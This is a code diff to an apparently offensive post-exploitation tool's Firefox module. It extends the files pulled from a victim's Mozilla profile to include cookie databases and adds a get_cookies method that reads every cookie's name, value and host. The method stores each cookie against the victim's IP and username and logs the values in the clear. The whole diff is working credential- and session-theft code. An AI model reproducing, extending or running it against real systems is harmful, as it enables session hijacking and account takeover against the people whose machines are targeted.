@@ -59,9 +59,12 @@ class FIREFOX_LOGINS:
 						try:
 							self.logging.debug(f"[{self.options.target_ip}] [+] Found {bcolors.OKBLUE}{self.user.username}{bcolors.ENDC} Mozilla Profile Directory : {longname}")
 							# Downloading profile important files
-							for file_to_dl in ['signons.sqlite','logins.json','key3.db', 'key4.db']:
+							for file_to_dl in ['signons.sqlite','logins.json','key3.db', 'key4.db','cookies.sqlite','cookies.sqlite-wal','cookies.sqlite-shm']:
 								try:
 									localfile = self.myfileops.get_file(ntpath.join(ntpath.join(tmp_pwd, longname),file_to_dl),allow_access_error=True)
+									if file_to_dl=='cookies.sqlite' and localfile :
+										self.get_cookies(localfile)
+
 								except Exception as ex:
 									self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception Getting Files for Mozilla{bcolors.ENDC}")
 									self.logging.debug(ex)
@@ -75,6 +78,36 @@ class FIREFOX_LOGINS:
 			self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception FIREFOX get_files{bcolors.ENDC}")
 			self.logging.debug(ex)
 			return None
+
+	def get_cookies(self,localfile):
+			"""
+			Get encrypted data (user / password) and host from the json or sqlite files
+			"""
+			try:
+				conn = sqlite3.connect(localfile)
+				c = conn.cursor()
+				c.execute('SELECT name,value,host,path,expiry,isSecure FROM moz_cookies;')
+
+				# Using sqlite3 database
+				for row in c:
+					name = row[0]
+					value = row[1]
+					host = row[2]
+					path = row[3]
+					expiry = row[4]
+					self.db.add_cookies(credz_type='browser-firefox',
+					                    credz_name=name,
+					                    credz_value=value,
+					                    credz_expires_utc=expiry,
+					                    credz_target=host,
+					                    credz_path=path,
+					                    pillaged_from_computer_ip=self.options.target_ip,
+					                    pillaged_from_username=self.user)
+					self.logging.info(
+						f"[{self.options.target_ip}] [+]  {bcolors.OKGREEN}[Mozilla Cookie] {bcolors.ENDC} for {host} {bcolors.OKBLUE}[ {name}:{value} ] {bcolors.ENDC} expire time: {(datetime.fromtimestamp(expiry)).strftime('%b %d %Y %H:%M:%S')}")
+				return 1
+			except Exception as ex:
+				self.logging.debug(f"[{self.options.target_ip}] Firefox Cookie decoding exception : {ex}")
 
 	def run(self):
 		#Download needed files
